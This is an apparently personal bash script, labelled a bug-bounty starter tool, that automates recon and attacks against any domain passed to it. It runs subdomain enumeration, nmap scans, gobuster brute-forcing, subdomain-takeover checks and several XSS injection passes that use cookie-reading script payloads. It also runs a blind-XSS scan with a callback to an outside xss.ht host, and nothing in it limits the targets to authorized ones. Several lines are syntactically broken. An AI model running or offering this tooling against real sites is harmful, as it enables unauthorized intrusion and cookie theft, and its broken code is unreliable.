##!/bin/bash

figlet -w 200 -f standard "Bounty Starter Tool"       

echo "usage: sudo ./bountystarter <enter_any_domain_name> "
echo "build by Vishal Patil"


echo "\n\n[+] Creating Folder for Scans"
# Create a Folder for all Scan
mkdir $1
cd $1

echo "\n\n[+] Starting amass"
# starting amass
amass enum --passive -d $1 -o domains_$1

echo "\n\n[+] Start assetfinder"
# starting assetfinder
assetfinder --subs-only $1 | tee -a domains_$1

echo "\n\n[+] Start massdns"
# starting massdns 
#/opt/bug-bounty/massdns/scripts/subbrute.py /usr/share/seclists/Discovery/DNS/dns-Jhaddix.txt $1 | /opt/bug-bounty/massdns/bin/massdns -r /opt/bug-bounty/massdns/lists/resolvers.txt -t A -o S -w massDNS_$1.txt

echo "\n\n[+] Start Subfinder"
# startting Subfinder

/home/vishal/go/bin/subfinder -d $1 | tee -a domains_subfinder_$1
cat domains_subfinder_$1 | tee -a domain_$1
rm domains_subfinder_$1

echo "\n\n[+] Format Output"
# Format massdns Output
#cat massDNS_$1.txt | cut -d ' ' -f1 | tee -a domain_$1

# using manual tools
/opt/bug-bounty/sd-goo/sd-goo.sh $1 | tee -a domain_$1


# removing duplicate entries
sort -u domains_$1 -o domains_$1

# filtering the domains
cat domains_$1 | /home/vishal/go/bin/filter-resolved | tee -a domains_$1.txt

rm domains_$1

# Scanning Hosts
mkdir nmap
echo "\n\n[+] Start nmap Scan"
nmap -sS -sV -iL domains_$1.txt -v -oA nmap/nmap_sS_sV_iL_$1


#finding live subdomains

cat domains_$1.txt | /home/vishal/go/bin/httpx | tee -a abcd.txt
cat abcd.txt | /home/vishal/go/bin/httpx -title -tech-detect -status-code | grep -v 'Error 404' | tee -a httpx.txt
rm abcd.txt
#extracting good subdomains
cat httpx.txt | awk -F ' ' {'print $1'} | tee -a live_domains.txt


# checking for alive domains
echo "\n\n[+] Checking for alive Web domains:\n"
cat domains_$1.txt | /home/vishal/go/bin/httprobe -p http:81 -p http:8080 -p https:8443 | tee -a alive_$1.txt
cat alive_$1.txt | /home/vishal/go/bin/gau | /home/vishal/.local/bin/uro > endpoints.txt
cat endpoints.txt | tee -a urls_$1.txt

# Searching HTPPS-Domains
cat alive_$1.txt | grep "https" | cut -d '/' -f3 | tee https_alive_$1.txt

# Checking Certs
echo "\n\n[+] Checking SSL-Certificates:\n"
mkdir SSLScans
while read p;do
  sslscan -no-colour $p | tee SSLScans/$p.txt
done < https_alive_$1.txt

echo "\n\n [+] Generating URLS:\n"
cat alive_$1.txt | /home/vishal/go/bin/waybackurls | tee -a wayback_$1.txt
cat alive_$1.txt | /home/vishal/go/bin/hakrawler  | tee -a hakrawler_$1.txt
cat wayback_$1.txt | tee -a urls_$1.txt
cat hakrawler_$1.txt | tee -a urls_$1.txt
sort -u urls_$1.txt -o urls_$1.txt

# trying xss attack on search bar 

cp endpoints.txt endpoints1.txt
sed -E -i "s/\?(.*)|$/\?q=%3C%2Fscript%3E%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E/g" endpoints1.txt
/home/vishal/go/bin/httpx -l endpoints.txt -ms "</script><script>alert(document.cookie)</script>"
cp urls_$1.txt  endpoint.txt
sed -E -i "s/\?(.*)|$/\?q=%3C%2Fscript%3E%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E/g" endpoint.txt
/home/vishal/go/bin/httpx -l endpoint.txt -ms "</script><script>alert(document.cookie)</script>"

#check here must be no 404 present. 
cat urls_$1.txt | /home/vishal/go/bin/httpx -title -tech-detect -status-code | grep -v 404 | tee -a superlive_endpoints.txt
rm urls_$1.txt && mv superlive_endpoints.txt urls_$1.txt

#gobuster 

mkdir gobuster
while read p; do
  filename=$(echo $p | cut -d '/' -f3)
  
  gobuster dir -u "$p" -w /usr/share/wordlists/dirb/common.txt  -b 403,404 -x php,html,txt,cgi,asp,aspx -t 50 --timeout 20s -o gobuster/gobuster_dir_$1_$filename.txt
    cat gobuster_dir_$1_$filename.txt | tee -a gobuster_$1.txt
done < alive_$1.txt

while read p; do
  filename=$(echo $p | cut -d '/' -f3)
  
  gobuster dir -u "$p" -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt -f -e -r -k -t 50 --timeout 20s -o gobuster/gobuster_dir_$1_$filename.txt
  cat gobuster_dir_$1_$filename.txt | tee -a gobuster_$1.txt
done < alive_$1.txt

while read p; do
  filename=$(echo $p | cut -d '/' -f3)
  gobuster dir -u "$p" -w /usr/share/seclists/Discovery/Web-Content/raft-large-files-lowercase.txt -f -e -r -k -t 50 --timeout 20s -o gobuster/gobuster_files_$1_$filename.txt
  cat gobuster_files_$1_$filename.txt | tee -a gobuster_$1.txt
done < alive_$1.txt

cat gobuster_$1.txt | cut -d ' ' -f1 | tee -a urls_$1.txt

echo "\n\n[+] Checking for Vulns:\n"

cat urls_$1.txt | /home/vishal/go/bin/kxss | tee kxxs_$1.txt
cat urls_$1.txt | grep "url=" | tee ssrf_$1.txt
cat urls_$1.txt | grep "id=[\d]*" | tee idor_$1.txt
cat urls_$1.txt | /home/vishal/go/bin/gf xss | tee -a xss_list.txt
cat domains_$1 | /home/vishal/go/bin/qsreplace | /home/vishal/go/bin/kxss
 
subjack -w alive_$1.txt -timeout 30 -o tmp_subdomain_takeover_$1.txt -ssl -v
cat subdomain_takeover_$1.txt | grep -v "\[Not Vulnerable\]" | tee subdomain_takeover_$1.txt
rm tmp_subdomain_takeover_$1.txt


# xss attack
/home/vishal/go/bin/gospider -S urls_$1.txt -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}'| grep "=" | /home/vishal/go/bin/qsreplace -a | /home/vishal/go/bin/dalfox pipe -o result.txt

cat urls_$1.txt | gf xss | sed ‘s/=.*/=/’ | sed ‘s/URL: //’ | tee testxss.txt ; dalfox file testxss.txt -b https://lucifer1337.xss.ht
# xss attack 2 

waybackurls $1 | grep '=' |/home/vishal/go/bin/qsreplace '"><script>alert(1)</script>' | while read host do ; do curl -s --path-as-is --insecure "$host" | grep -qs "<script>alert(1)</script>" && echo "$host \033[0;31m" Vulnerable;done

# xss attack 3
gospider -S cat domains_$1 -t 3 -c 100 |  tr " " "\n" | grep -v ".js" | grep "https://" | grep "=" | grep '=' |qsreplace '"><script>alert(1)</script>' | while read host do ; do curl -s --path-as-is --insecure "$host" | grep -qs "<script>alert(1)</script>" && echo "$host \033[0;31m" Vulnerable;done

#xss attack 4
cat urls_$1.txt | /home/vishal/go/bin/qsreplace '"><img src=x onerror=alert(1)>' | tee -a xss_fuzz.txt
cat xss_fuzz.txt | /home/vishal/go/bin/freq | tee -a possible_xss.txt

